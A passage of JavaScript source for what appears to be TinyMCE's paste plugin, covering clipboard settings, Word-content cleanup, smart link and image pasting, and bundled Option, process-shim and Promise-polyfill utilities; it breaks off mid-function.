(function () {
var paste = (function (domGlobals) {
    'use strict';

    var Cell = function (initial) {
      var value = initial;
      var get = function () {
        return value;
      };
      var set = function (v) {
        value = v;
      };
      var clone = function () {
        return Cell(get());
      };
      return {
        get: get,
        set: set,
        clone: clone
      };
    };

    var global$1 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var hasProPlugin = function (editor) {
      if (/(^|[ ,])powerpaste([, ]|$)/.test(editor.settings.plugins) && global$1.get('powerpaste')) {
        if (typeof domGlobals.window.console !== 'undefined' && domGlobals.window.console.log) {
          domGlobals.window.console.log('PowerPaste is incompatible with Paste plugin! Remove \'paste\' from the \'plugins\' option.');
        }
        return true;
      } else {
        return false;
      }
    };
    var DetectProPlugin = { hasProPlugin: hasProPlugin };

    var get = function (clipboard, quirks) {
      return {
        clipboard: clipboard,
        quirks: quirks
      };
    };
    var Api = { get: get };

    var firePastePreProcess = function (editor, html, internal, isWordHtml) {
      return editor.fire('PastePreProcess', {
        content: html,
        internal: internal,
        wordContent: isWordHtml
      });
    };
    var firePastePostProcess = function (editor, node, internal, isWordHtml) {
      return editor.fire('PastePostProcess', {
        node: node,
        internal: internal,
        wordContent: isWordHtml
      });
    };
    var firePastePlainTextToggle = function (editor, state) {
      return editor.fire('PastePlainTextToggle', { state: state });
    };
    var firePaste = function (editor, ieFake) {
      return editor.fire('paste', { ieFake: ieFake });
    };
    var Events = {
      firePastePreProcess: firePastePreProcess,
      firePastePostProcess: firePastePostProcess,
      firePastePlainTextToggle: firePastePlainTextToggle,
      firePaste: firePaste
    };

    var shouldPlainTextInform = function (editor) {
      return editor.getParam('paste_plaintext_inform', true);
    };
    var shouldBlockDrop = function (editor) {
      return editor.getParam('paste_block_drop', false);
    };
    var shouldPasteDataImages = function (editor) {
      return editor.getParam('paste_data_images', false);
    };
    var shouldFilterDrop = function (editor) {
      return editor.getParam('paste_filter_drop', true);
    };
    var getPreProcess = function (editor) {
      return editor.getParam('paste_preprocess');
    };
    var getPostProcess = function (editor) {
      return editor.getParam('paste_postprocess');
    };
    var getWebkitStyles = function (editor) {
      return editor.getParam('paste_webkit_styles');
    };
    var shouldRemoveWebKitStyles = function (editor) {
      return editor.getParam('paste_remove_styles_if_webkit', true);
    };
    var shouldMergeFormats = function (editor) {
      return editor.getParam('paste_merge_formats', true);
    };
    var isSmartPasteEnabled = function (editor) {
      return editor.getParam('smart_paste', true);
    };
    var isPasteAsTextEnabled = function (editor) {
      return editor.getParam('paste_as_text', false);
    };
    var getRetainStyleProps = function (editor) {
      return editor.getParam('paste_retain_style_properties');
    };
    var getWordValidElements = function (editor) {
      var defaultValidElements = '-strong/b,-em/i,-u,-span,-p,-ol,-ul,-li,-h1,-h2,-h3,-h4,-h5,-h6,' + '-p/div,-a[href|name],sub,sup,strike,br,del,table[width],tr,' + 'td[colspan|rowspan|width],th[colspan|rowspan|width],thead,tfoot,tbody';
      return editor.getParam('paste_word_valid_elements', defaultValidElements);
    };
    var shouldConvertWordFakeLists = function (editor) {
      return editor.getParam('paste_convert_word_fake_lists', true);
    };
    var shouldUseDefaultFilters = function (editor) {
      return editor.getParam('paste_enable_default_filters', true);
    };
    var Settings = {
      shouldPlainTextInform: shouldPlainTextInform,
      shouldBlockDrop: shouldBlockDrop,
      shouldPasteDataImages: shouldPasteDataImages,
      shouldFilterDrop: shouldFilterDrop,
      getPreProcess: getPreProcess,
      getPostProcess: getPostProcess,
      getWebkitStyles: getWebkitStyles,
      shouldRemoveWebKitStyles: shouldRemoveWebKitStyles,
      shouldMergeFormats: shouldMergeFormats,
      isSmartPasteEnabled: isSmartPasteEnabled,
      isPasteAsTextEnabled: isPasteAsTextEnabled,
      getRetainStyleProps: getRetainStyleProps,
      getWordValidElements: getWordValidElements,
      shouldConvertWordFakeLists: shouldConvertWordFakeLists,
      shouldUseDefaultFilters: shouldUseDefaultFilters
    };

    var shouldInformUserAboutPlainText = function (editor, userIsInformedState) {
      return userIsInformedState.get() === false && Settings.shouldPlainTextInform(editor);
    };
    var displayNotification = function (editor, message) {
      editor.notificationManager.open({
        text: editor.translate(message),
        type: 'info'
      });
    };
    var togglePlainTextPaste = function (editor, clipboard, userIsInformedState) {
      if (clipboard.pasteFormat.get() === 'text') {
        clipboard.pasteFormat.set('html');
        Events.firePastePlainTextToggle(editor, false);
      } else {
        clipboard.pasteFormat.set('text');
        Events.firePastePlainTextToggle(editor, true);
        if (shouldInformUserAboutPlainText(editor, userIsInformedState)) {
          displayNotification(editor, 'Paste is now in plain text mode. Contents will now be pasted as plain text until you toggle this option off.');
          userIsInformedState.set(true);
        }
      }
      editor.focus();
    };
    var Actions = { togglePlainTextPaste: togglePlainTextPaste };

    var register = function (editor, clipboard, userIsInformedState) {
      editor.addCommand('mceTogglePlainTextPaste', function () {
        Actions.togglePlainTextPaste(editor, clipboard, userIsInformedState);
      });
      editor.addCommand('mceInsertClipboardContent', function (ui, value) {
        if (value.content) {
          clipboard.pasteHtml(value.content, value.internal);
        }
        if (value.text) {
          clipboard.pasteText(value.text);
        }
      });
    };
    var Commands = { register: register };

    var global$2 = tinymce.util.Tools.resolve('tinymce.Env');

    var global$3 = tinymce.util.Tools.resolve('tinymce.util.Delay');

    var global$4 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    var global$5 = tinymce.util.Tools.resolve('tinymce.util.VK');

    var internalMimeType = 'x-tinymce/html';
    var internalMark = '<!-- ' + internalMimeType + ' -->';
    var mark = function (html) {
      return internalMark + html;
    };
    var unmark = function (html) {
      return html.replace(internalMark, '');
    };
    var isMarked = function (html) {
      return html.indexOf(internalMark) !== -1;
    };
    var InternalHtml = {
      mark: mark,
      unmark: unmark,
      isMarked: isMarked,
      internalHtmlMime: function () {
        return internalMimeType;
      }
    };

    var global$6 = tinymce.util.Tools.resolve('tinymce.html.Entities');

    var isPlainText = function (text) {
      return !/<(?:\/?(?!(?:div|p|br|span)>)\w+|(?:(?!(?:span style="white-space:\s?pre;?">)|br\s?\/>))\w+\s[^>]+)>/i.test(text);
    };
    var toBRs = function (text) {
      return text.replace(/\r?\n/g, '<br>');
    };
    var openContainer = function (rootTag, rootAttrs) {
      var key;
      var attrs = [];
      var tag = '<' + rootTag;
      if (typeof rootAttrs === 'object') {
        for (key in rootAttrs) {
          if (rootAttrs.hasOwnProperty(key)) {
            attrs.push(key + '="' + global$6.encodeAllRaw(rootAttrs[key]) + '"');
          }
        }
        if (attrs.length) {
          tag += ' ' + attrs.join(' ');
        }
      }
      return tag + '>';
    };
    var toBlockElements = function (text, rootTag, rootAttrs) {
      var blocks = text.split(/\n\n/);
      var tagOpen = openContainer(rootTag, rootAttrs);
      var tagClose = '</' + rootTag + '>';
      var paragraphs = global$4.map(blocks, function (p) {
        return p.split(/\n/).join('<br />');
      });
      var stitch = function (p) {
        return tagOpen + p + tagClose;
      };
      return paragraphs.length === 1 ? paragraphs[0] : global$4.map(paragraphs, stitch).join('');
    };
    var convert = function (text, rootTag, rootAttrs) {
      return rootTag ? toBlockElements(text, rootTag, rootAttrs) : toBRs(text);
    };
    var Newlines = {
      isPlainText: isPlainText,
      convert: convert,
      toBRs: toBRs,
      toBlockElements: toBlockElements
    };

    var global$7 = tinymce.util.Tools.resolve('tinymce.html.DomParser');

    var global$8 = tinymce.util.Tools.resolve('tinymce.html.Serializer');

    var global$9 = tinymce.util.Tools.resolve('tinymce.html.Node');

    var global$a = tinymce.util.Tools.resolve('tinymce.html.Schema');

    function filter(content, items) {
      global$4.each(items, function (v) {
        if (v.constructor === RegExp) {
          content = content.replace(v, '');
        } else {
          content = content.replace(v[0], v[1]);
        }
      });
      return content;
    }
    function innerText(html) {
      var schema = global$a();
      var domParser = global$7({}, schema);
      var text = '';
      var shortEndedElements = schema.getShortEndedElements();
      var ignoreElements = global$4.makeMap('script noscript style textarea video audio iframe object', ' ');
      var blockElements = schema.getBlockElements();
      function walk(node) {
        var name = node.name, currentNode = node;
        if (name === 'br') {
          text += '\n';
          return;
        }
        if (name === 'wbr') {
          return;
        }
        if (shortEndedElements[name]) {
          text += ' ';
        }
        if (ignoreElements[name]) {
          text += ' ';
          return;
        }
        if (node.type === 3) {
          text += node.value;
        }
        if (!node.shortEnded) {
          if (node = node.firstChild) {
            do {
              walk(node);
            } while (node = node.next);
          }
        }
        if (blockElements[name] && currentNode.next) {
          text += '\n';
          if (name === 'p') {
            text += '\n';
          }
        }
      }
      html = filter(html, [/<!\[[^\]]+\]>/g]);
      walk(domParser.parse(html));
      return text;
    }
    function trimHtml(html) {
      function trimSpaces(all, s1, s2) {
        if (!s1 && !s2) {
          return ' ';
        }
        return '\xA0';
      }
      html = filter(html, [
        /^[\s\S]*<body[^>]*>\s*|\s*<\/body[^>]*>[\s\S]*$/ig,
        /<!--StartFragment-->|<!--EndFragment-->/g,
        [
          /( ?)<span class="Apple-converted-space">\u00a0<\/span>( ?)/g,
          trimSpaces
        ],
        /<br class="Apple-interchange-newline">/g,
        /<br>$/i
      ]);
      return html;
    }
    function createIdGenerator(prefix) {
      var count = 0;
      return function () {
        return prefix + count++;
      };
    }
    var isMsEdge = function () {
      return domGlobals.navigator.userAgent.indexOf(' Edge/') !== -1;
    };
    var Utils = {
      filter: filter,
      innerText: innerText,
      trimHtml: trimHtml,
      createIdGenerator: createIdGenerator,
      isMsEdge: isMsEdge
    };

    function isWordContent(content) {
      return /<font face="Times New Roman"|class="?Mso|style="[^"]*\bmso-|style='[^'']*\bmso-|w:WordDocument/i.test(content) || /class="OutlineElement/.test(content) || /id="?docs\-internal\-guid\-/.test(content);
    }
    function isNumericList(text) {
      var found, patterns;
      patterns = [
        /^[IVXLMCD]{1,2}\.[ \u00a0]/,
        /^[ivxlmcd]{1,2}\.[ \u00a0]/,
        /^[a-z]{1,2}[\.\)][ \u00a0]/,
        /^[A-Z]{1,2}[\.\)][ \u00a0]/,
        /^[0-9]+\.[ \u00a0]/,
        /^[\u3007\u4e00\u4e8c\u4e09\u56db\u4e94\u516d\u4e03\u516b\u4e5d]+\.[ \u00a0]/,
        /^[\u58f1\u5f10\u53c2\u56db\u4f0d\u516d\u4e03\u516b\u4e5d\u62fe]+\.[ \u00a0]/
      ];
      text = text.replace(/^[\u00a0 ]+/, '');
      global$4.each(patterns, function (pattern) {
        if (pattern.test(text)) {
          found = true;
          return false;
        }
      });
      return found;
    }
    function isBulletList(text) {
      return /^[\s\u00a0]*[\u2022\u00b7\u00a7\u25CF]\s*/.test(text);
    }
    function convertFakeListsToProperLists(node) {
      var currentListNode, prevListNode, lastLevel = 1;
      function getText(node) {
        var txt = '';
        if (node.type === 3) {
          return node.value;
        }
        if (node = node.firstChild) {
          do {
            txt += getText(node);
          } while (node = node.next);
        }
        return txt;
      }
      function trimListStart(node, regExp) {
        if (node.type === 3) {
          if (regExp.test(node.value)) {
            node.value = node.value.replace(regExp, '');
            return false;
          }
        }
        if (node = node.firstChild) {
          do {
            if (!trimListStart(node, regExp)) {
              return false;
            }
          } while (node = node.next);
        }
        return true;
      }
      function removeIgnoredNodes(node) {
        if (node._listIgnore) {
          node.remove();
          return;
        }
        if (node = node.firstChild) {
          do {
            removeIgnoredNodes(node);
          } while (node = node.next);
        }
      }
      function convertParagraphToLi(paragraphNode, listName, start) {
        var level = paragraphNode._listLevel || lastLevel;
        if (level !== lastLevel) {
          if (level < lastLevel) {
            if (currentListNode) {
              currentListNode = currentListNode.parent.parent;
            }
          } else {
            prevListNode = currentListNode;
            currentListNode = null;
          }
        }
        if (!currentListNode || currentListNode.name !== listName) {
          prevListNode = prevListNode || currentListNode;
          currentListNode = new global$9(listName, 1);
          if (start > 1) {
            currentListNode.attr('start', '' + start);
          }
          paragraphNode.wrap(currentListNode);
        } else {
          currentListNode.append(paragraphNode);
        }
        paragraphNode.name = 'li';
        if (level > lastLevel && prevListNode) {
          prevListNode.lastChild.append(currentListNode);
        }
        lastLevel = level;
        removeIgnoredNodes(paragraphNode);
        trimListStart(paragraphNode, /^\u00a0+/);
        trimListStart(paragraphNode, /^\s*([\u2022\u00b7\u00a7\u25CF]|\w+\.)/);
        trimListStart(paragraphNode, /^\u00a0+/);
      }
      var elements = [];
      var child = node.firstChild;
      while (typeof child !== 'undefined' && child !== null) {
        elements.push(child);
        child = child.walk();
        if (child !== null) {
          while (typeof child !== 'undefined' && child.parent !== node) {
            child = child.walk();
          }
        }
      }
      for (var i = 0; i < elements.length; i++) {
        node = elements[i];
        if (node.name === 'p' && node.firstChild) {
          var nodeText = getText(node);
          if (isBulletList(nodeText)) {
            convertParagraphToLi(node, 'ul');
            continue;
          }
          if (isNumericList(nodeText)) {
            var matches = /([0-9]+)\./.exec(nodeText);
            var start = 1;
            if (matches) {
              start = parseInt(matches[1], 10);
            }
            convertParagraphToLi(node, 'ol', start);
            continue;
          }
          if (node._listLevel) {
            convertParagraphToLi(node, 'ul', 1);
            continue;
          }
          currentListNode = null;
        } else {
          prevListNode = currentListNode;
          currentListNode = null;
        }
      }
    }
    function filterStyles(editor, validStyles, node, styleValue) {
      var outputStyles = {}, matches;
      var styles = editor.dom.parseStyle(styleValue);
      global$4.each(styles, function (value, name) {
        switch (name) {
        case 'mso-list':
          matches = /\w+ \w+([0-9]+)/i.exec(styleValue);
          if (matches) {
            node._listLevel = parseInt(matches[1], 10);
          }
          if (/Ignore/i.test(value) && node.firstChild) {
            node._listIgnore = true;
            node.firstChild._listIgnore = true;
          }
          break;
        case 'horiz-align':
          name = 'text-align';
          break;
        case 'vert-align':
          name = 'vertical-align';
          break;
        case 'font-color':
        case 'mso-foreground':
          name = 'color';
          break;
        case 'mso-background':
        case 'mso-highlight':
          name = 'background';
          break;
        case 'font-weight':
        case 'font-style':
          if (value !== 'normal') {
            outputStyles[name] = value;
          }
          return;
        case 'mso-element':
          if (/^(comment|comment-list)$/i.test(value)) {
            node.remove();
            return;
          }
          break;
        }
        if (name.indexOf('mso-comment') === 0) {
          node.remove();
          return;
        }
        if (name.indexOf('mso-') === 0) {
          return;
        }
        if (Settings.getRetainStyleProps(editor) === 'all' || validStyles && validStyles[name]) {
          outputStyles[name] = value;
        }
      });
      if (/(bold)/i.test(outputStyles['font-weight'])) {
        delete outputStyles['font-weight'];
        node.wrap(new global$9('b', 1));
      }
      if (/(italic)/i.test(outputStyles['font-style'])) {
        delete outputStyles['font-style'];
        node.wrap(new global$9('i', 1));
      }
      outputStyles = editor.dom.serializeStyle(outputStyles, node.name);
      if (outputStyles) {
        return outputStyles;
      }
      return null;
    }
    var filterWordContent = function (editor, content) {
      var retainStyleProperties, validStyles;
      retainStyleProperties = Settings.getRetainStyleProps(editor);
      if (retainStyleProperties) {
        validStyles = global$4.makeMap(retainStyleProperties.split(/[, ]/));
      }
      content = Utils.filter(content, [
        /<br class="?Apple-interchange-newline"?>/gi,
        /<b[^>]+id="?docs-internal-[^>]*>/gi,
        /<!--[\s\S]+?-->/gi,
        /<(!|script[^>]*>.*?<\/script(?=[>\s])|\/?(\?xml(:\w+)?|img|meta|link|style|\w:\w+)(?=[\s\/>]))[^>]*>/gi,
        [
          /<(\/?)s>/gi,
          '<$1strike>'
        ],
        [
          /&nbsp;/gi,
          '\xA0'
        ],
        [
          /<span\s+style\s*=\s*"\s*mso-spacerun\s*:\s*yes\s*;?\s*"\s*>([\s\u00a0]*)<\/span>/gi,
          function (str, spaces) {
            return spaces.length > 0 ? spaces.replace(/./, ' ').slice(Math.floor(spaces.length / 2)).split('').join('\xA0') : '';
          }
        ]
      ]);
      var validElements = Settings.getWordValidElements(editor);
      var schema = global$a({
        valid_elements: validElements,
        valid_children: '-li[p]'
      });
      global$4.each(schema.elements, function (rule) {
        if (!rule.attributes.class) {
          rule.attributes.class = {};
          rule.attributesOrder.push('class');
        }
        if (!rule.attributes.style) {
          rule.attributes.style = {};
          rule.attributesOrder.push('style');
        }
      });
      var domParser = global$7({}, schema);
      domParser.addAttributeFilter('style', function (nodes) {
        var i = nodes.length, node;
        while (i--) {
          node = nodes[i];
          node.attr('style', filterStyles(editor, validStyles, node, node.attr('style')));
          if (node.name === 'span' && node.parent && !node.attributes.length) {
            node.unwrap();
          }
        }
      });
      domParser.addAttributeFilter('class', function (nodes) {
        var i = nodes.length, node, className;
        while (i--) {
          node = nodes[i];
          className = node.attr('class');
          if (/^(MsoCommentReference|MsoCommentText|msoDel)$/i.test(className)) {
            node.remove();
          }
          node.attr('class', null);
        }
      });
      domParser.addNodeFilter('del', function (nodes) {
        var i = nodes.length;
        while (i--) {
          nodes[i].remove();
        }
      });
      domParser.addNodeFilter('a', function (nodes) {
        var i = nodes.length, node, href, name;
        while (i--) {
          node = nodes[i];
          href = node.attr('href');
          name = node.attr('name');
          if (href && href.indexOf('#_msocom_') !== -1) {
            node.remove();
            continue;
          }
          if (href && href.indexOf('file://') === 0) {
            href = href.split('#')[1];
            if (href) {
              href = '#' + href;
            }
          }
          if (!href && !name) {
            node.unwrap();
          } else {
            if (name && !/^_?(?:toc|edn|ftn)/i.test(name)) {
              node.unwrap();
              continue;
            }
            node.attr({
              href: href,
              name: name
            });
          }
        }
      });
      var rootNode = domParser.parse(content);
      if (Settings.shouldConvertWordFakeLists(editor)) {
        convertFakeListsToProperLists(rootNode);
      }
      content = global$8({ validate: editor.settings.validate }, schema).serialize(rootNode);
      return content;
    };
    var preProcess = function (editor, content) {
      return Settings.shouldUseDefaultFilters(editor) ? filterWordContent(editor, content) : content;
    };
    var WordFilter = {
      preProcess: preProcess,
      isWordContent: isWordContent
    };

    var preProcess$1 = function (editor, html) {
      var parser = global$7({}, editor.schema);
      parser.addNodeFilter('meta', function (nodes) {
        global$4.each(nodes, function (node) {
          return node.remove();
        });
      });
      var fragment = parser.parse(html, {
        forced_root_block: false,
        isRootContent: true
      });
      return global$8({ validate: editor.settings.validate }, editor.schema).serialize(fragment);
    };
    var processResult = function (content, cancelled) {
      return {
        content: content,
        cancelled: cancelled
      };
    };
    var postProcessFilter = function (editor, html, internal, isWordHtml) {
      var tempBody = editor.dom.create('div', { style: 'display:none' }, html);
      var postProcessArgs = Events.firePastePostProcess(editor, tempBody, internal, isWordHtml);
      return processResult(postProcessArgs.node.innerHTML, postProcessArgs.isDefaultPrevented());
    };
    var filterContent = function (editor, content, internal, isWordHtml) {
      var preProcessArgs = Events.firePastePreProcess(editor, content, internal, isWordHtml);
      var filteredContent = preProcess$1(editor, preProcessArgs.content);
      if (editor.hasEventListeners('PastePostProcess') && !preProcessArgs.isDefaultPrevented()) {
        return postProcessFilter(editor, filteredContent, internal, isWordHtml);
      } else {
        return processResult(filteredContent, preProcessArgs.isDefaultPrevented());
      }
    };
    var process = function (editor, html, internal) {
      var isWordHtml = WordFilter.isWordContent(html);
      var content = isWordHtml ? WordFilter.preProcess(editor, html) : html;
      return filterContent(editor, content, internal, isWordHtml);
    };
    var ProcessFilters = { process: process };

    var pasteHtml = function (editor, html) {
      editor.insertContent(html, {
        merge: Settings.shouldMergeFormats(editor),
        paste: true
      });
      return true;
    };
    var isAbsoluteUrl = function (url) {
      return /^https?:\/\/[\w\?\-\/+=.&%@~#]+$/i.test(url);
    };
    var isImageUrl = function (url) {
      return isAbsoluteUrl(url) && /.(gif|jpe?g|png)$/.test(url);
    };
    var createImage = function (editor, url, pasteHtmlFn) {
      editor.undoManager.extra(function () {
        pasteHtmlFn(editor, url);
      }, function () {
        editor.insertContent('<img src="' + url + '">');
      });
      return true;
    };
    var createLink = function (editor, url, pasteHtmlFn) {
      editor.undoManager.extra(function () {
        pasteHtmlFn(editor, url);
      }, function () {
        editor.execCommand('mceInsertLink', false, url);
      });
      return true;
    };
    var linkSelection = function (editor, html, pasteHtmlFn) {
      return editor.selection.isCollapsed() === false && isAbsoluteUrl(html) ? createLink(editor, html, pasteHtmlFn) : false;
    };
    var insertImage = function (editor, html, pasteHtmlFn) {
      return isImageUrl(html) ? createImage(editor, html, pasteHtmlFn) : false;
    };
    var smartInsertContent = function (editor, html) {
      global$4.each([
        linkSelection,
        insertImage,
        pasteHtml
      ], function (action) {
        return action(editor, html, pasteHtml) !== true;
      });
    };
    var insertContent = function (editor, html) {
      if (Settings.isSmartPasteEnabled(editor) === false) {
        pasteHtml(editor, html);
      } else {
        smartInsertContent(editor, html);
      }
    };
    var SmartPaste = {
      isImageUrl: isImageUrl,
      isAbsoluteUrl: isAbsoluteUrl,
      insertContent: insertContent
    };

    var noop = function () {
    };
    var constant = function (value) {
      return function () {
        return value;
      };
    };
    function curry(fn) {
      var initialArgs = [];
      for (var _i = 1; _i < arguments.length; _i++) {
        initialArgs[_i - 1] = arguments[_i];
      }
      return function () {
        var restArgs = [];
        for (var _i = 0; _i < arguments.length; _i++) {
          restArgs[_i] = arguments[_i];
        }
        var all = initialArgs.concat(restArgs);
        return fn.apply(null, all);
      };
    }
    var never = constant(false);
    var always = constant(true);

    var none = function () {
      return NONE;
    };
    var NONE = function () {
      var eq = function (o) {
        return o.isNone();
      };
      var call = function (thunk) {
        return thunk();
      };
      var id = function (n) {
        return n;
      };
      var me = {
        fold: function (n, s) {
          return n();
        },
        is: never,
        isSome: never,
        isNone: always,
        getOr: id,
        getOrThunk: call,
        getOrDie: function (msg) {
          throw new Error(msg || 'error: getOrDie called on none.');
        },
        getOrNull: constant(null),
        getOrUndefined: constant(undefined),
        or: id,
        orThunk: call,
        map: none,
        each: noop,
        bind: none,
        exists: never,
        forall: always,
        filter: none,
        equals: eq,
        equals_: eq,
        toArray: function () {
          return [];
        },
        toString: constant('none()')
      };
      if (Object.freeze) {
        Object.freeze(me);
      }
      return me;
    }();
    var some = function (a) {
      var constant_a = constant(a);
      var self = function () {
        return me;
      };
      var bind = function (f) {
        return f(a);
      };
      var me = {
        fold: function (n, s) {
          return s(a);
        },
        is: function (v) {
          return a === v;
        },
        isSome: always,
        isNone: never,
        getOr: constant_a,
        getOrThunk: constant_a,
        getOrDie: constant_a,
        getOrNull: constant_a,
        getOrUndefined: constant_a,
        or: self,
        orThunk: self,
        map: function (f) {
          return some(f(a));
        },
        each: function (f) {
          f(a);
        },
        bind: bind,
        exists: bind,
        forall: bind,
        filter: function (f) {
          return f(a) ? me : NONE;
        },
        toArray: function () {
          return [a];
        },
        toString: function () {
          return 'some(' + a + ')';
        },
        equals: function (o) {
          return o.is(a);
        },
        equals_: function (o, elementEq) {
          return o.fold(never, function (b) {
            return elementEq(a, b);
          });
        }
      };
      return me;
    };
    var from = function (value) {
      return value === null || value === undefined ? NONE : some(value);
    };
    var Option = {
      some: some,
      none: none,
      from: from
    };

    var typeOf = function (x) {
      if (x === null) {
        return 'null';
      }
      var t = typeof x;
      if (t === 'object' && (Array.prototype.isPrototypeOf(x) || x.constructor && x.constructor.name === 'Array')) {
        return 'array';
      }
      if (t === 'object' && (String.prototype.isPrototypeOf(x) || x.constructor && x.constructor.name === 'String')) {
        return 'string';
      }
      return t;
    };
    var isType = function (type) {
      return function (value) {
        return typeOf(value) === type;
      };
    };
    var isFunction = isType('function');

    var nativeSlice = Array.prototype.slice;
    var map = function (xs, f) {
      var len = xs.length;
      var r = new Array(len);
      for (var i = 0; i < len; i++) {
        var x = xs[i];
        r[i] = f(x, i);
      }
      return r;
    };
    var each = function (xs, f) {
      for (var i = 0, len = xs.length; i < len; i++) {
        var x = xs[i];
        f(x, i);
      }
    };
    var filter$1 = function (xs, pred) {
      var r = [];
      for (var i = 0, len = xs.length; i < len; i++) {
        var x = xs[i];
        if (pred(x, i)) {
          r.push(x);
        }
      }
      return r;
    };
    var from$1 = isFunction(Array.from) ? Array.from : function (x) {
      return nativeSlice.call(x);
    };

    var exports$1 = {}, module = { exports: exports$1 };
    (function (define, exports, module, require) {
      (function (f) {
        if (typeof exports === 'object' && typeof module !== 'undefined') {
          module.exports = f();
        } else if (typeof define === 'function' && define.amd) {
          define([], f);
        } else {
          var g;
          if (typeof window !== 'undefined') {
            g = window;
          } else if (typeof global !== 'undefined') {
            g = global;
          } else if (typeof self !== 'undefined') {
            g = self;
          } else {
            g = this;
          }
          g.EphoxContactWrapper = f();
        }
      }(function () {
        return function () {
          function r(e, n, t) {
            function o(i, f) {
              if (!n[i]) {
                if (!e[i]) {
                  var c = 'function' == typeof require && require;
                  if (!f && c)
                    return c(i, !0);
                  if (u)
                    return u(i, !0);
                  var a = new Error('Cannot find module \'' + i + '\'');
                  throw a.code = 'MODULE_NOT_FOUND', a;
                }
                var p = n[i] = { exports: {} };
                e[i][0].call(p.exports, function (r) {
                  var n = e[i][1][r];
                  return o(n || r);
                }, p, p.exports, r, e, n, t);
              }
              return n[i].exports;
            }
            for (var u = 'function' == typeof require && require, i = 0; i < t.length; i++)
              o(t[i]);
            return o;
          }
          return r;
        }()({
          1: [
            function (require, module, exports) {
              var process = module.exports = {};
              var cachedSetTimeout;
              var cachedClearTimeout;
              function defaultSetTimout() {
                throw new Error('setTimeout has not been defined');
              }
              function defaultClearTimeout() {
                throw new Error('clearTimeout has not been defined');
              }
              (function () {
                try {
                  if (typeof setTimeout === 'function') {
                    cachedSetTimeout = setTimeout;
                  } else {
                    cachedSetTimeout = defaultSetTimout;
                  }
                } catch (e) {
                  cachedSetTimeout = defaultSetTimout;
                }
                try {
                  if (typeof clearTimeout === 'function') {
                    cachedClearTimeout = clearTimeout;
                  } else {
                    cachedClearTimeout = defaultClearTimeout;
                  }
                } catch (e) {
                  cachedClearTimeout = defaultClearTimeout;
                }
              }());
              function runTimeout(fun) {
                if (cachedSetTimeout === setTimeout) {
                  return setTimeout(fun, 0);
                }
                if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
                  cachedSetTimeout = setTimeout;
                  return setTimeout(fun, 0);
                }
                try {
                  return cachedSetTimeout(fun, 0);
                } catch (e) {
                  try {
                    return cachedSetTimeout.call(null, fun, 0);
                  } catch (e) {
                    return cachedSetTimeout.call(this, fun, 0);
                  }
                }
              }
              function runClearTimeout(marker) {
                if (cachedClearTimeout === clearTimeout) {
                  return clearTimeout(marker);
                }
                if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
                  cachedClearTimeout = clearTimeout;
                  return clearTimeout(marker);
                }
                try {
                  return cachedClearTimeout(marker);
                } catch (e) {
                  try {
                    return cachedClearTimeout.call(null, marker);
                  } catch (e) {
                    return cachedClearTimeout.call(this, marker);
                  }
                }
              }
              var queue = [];
              var draining = false;
              var currentQueue;
              var queueIndex = -1;
              function cleanUpNextTick() {
                if (!draining || !currentQueue) {
                  return;
                }
                draining = false;
                if (currentQueue.length) {
                  queue = currentQueue.concat(queue);
                } else {
                  queueIndex = -1;
                }
                if (queue.length) {
                  drainQueue();
                }
              }
              function drainQueue() {
                if (draining) {
                  return;
                }
                var timeout = runTimeout(cleanUpNextTick);
                draining = true;
                var len = queue.length;
                while (len) {
                  currentQueue = queue;
                  queue = [];
                  while (++queueIndex < len) {
                    if (currentQueue) {
                      currentQueue[queueIndex].run();
                    }
                  }
                  queueIndex = -1;
                  len = queue.length;
                }
                currentQueue = null;
                draining = false;
                runClearTimeout(timeout);
              }
              process.nextTick = function (fun) {
                var args = new Array(arguments.length - 1);
                if (arguments.length > 1) {
                  for (var i = 1; i < arguments.length; i++) {
                    args[i - 1] = arguments[i];
                  }
                }
                queue.push(new Item(fun, args));
                if (queue.length === 1 && !draining) {
                  runTimeout(drainQueue);
                }
              };
              function Item(fun, array) {
                this.fun = fun;
                this.array = array;
              }
              Item.prototype.run = function () {
                this.fun.apply(null, this.array);
              };
              process.title = 'browser';
              process.browser = true;
              process.env = {};
              process.argv = [];
              process.version = '';
              process.versions = {};
              function noop() {
              }
              process.on = noop;
              process.addListener = noop;
              process.once = noop;
              process.off = noop;
              process.removeListener = noop;
              process.removeAllListeners = noop;
              process.emit = noop;
              process.prependListener = noop;
              process.prependOnceListener = noop;
              process.listeners = function (name) {
                return [];
              };
              process.binding = function (name) {
                throw new Error('process.binding is not supported');
              };
              process.cwd = function () {
                return '/';
              };
              process.chdir = function (dir) {
                throw new Error('process.chdir is not supported');
              };
              process.umask = function () {
                return 0;
              };
            },
            {}
          ],
          2: [
            function (require, module, exports) {
              (function (setImmediate) {
                (function (root) {
                  var setTimeoutFunc = setTimeout;
                  function noop() {
                  }
                  function bind(fn, thisArg) {
                    return function () {
                      fn.apply(thisArg, arguments);
                    };
                  }
                  function Promise(fn) {
                    if (typeof this !== 'object')
                      throw new TypeError('Promises must be constructed via new');
                    if (typeof fn !== 'function')
                      throw new TypeError('not a function');
                    this._state = 0;
                    this._handled = false;
                    this._value = undefined;
                    this._deferreds = [];
                    doResolve(fn, this);
                  }
                  function handle(self, deferred) {
                    while (self._state === 3) {
                      self = self._value;
                    }
                    if (self._state === 0) {
                      self._deferreds.push(deferred);
                      return;
                    }
                    self._handled = true;
                    Promise._immediateFn(function () {
                      var cb = self._state === 1 ? deferred.onFulfilled : deferred.onRejected;
                      if (cb === null) {
                        (self._state === 1 ? resolve : reject)(deferred.promise, self._value);
                        return;
                      }
                      var ret;
                      try {
                        ret = cb(self._value);
                      } catch (e) {
                        reject(deferred.promise, e);
                        return;
                      }
                      resolve(deferred.promise, ret);
                    });
                  }
                  function resolve(self, newValue) {
                    try {
                      if (newValue === self)
                        throw new TypeError('A promise cannot be resolved with itself.');
                      if (newValue && (typeof newValue === 'object' || typeof newValue === 'function')) {
                        var then = newValue.then;
                        if (newValue instanceof Promise) {
                          self._state = 3;
                          self._value = newValue;
                          finale(self);
                          return;
                        } else if (typeof then === 'function') {
                          doResolve(bind(then, newValue), self);
                          return;
                        }
                      }
                      self._state = 1;
                      self._value = newValue;
                      finale(self);
                    } catch (e) {
                      reject(self, e);
                    }
                  }
                  function reject(self, newValue) {
                    self._state = 2;
                    self._value = newValue;
                    finale(self);
                  }
                  function finale(self) {
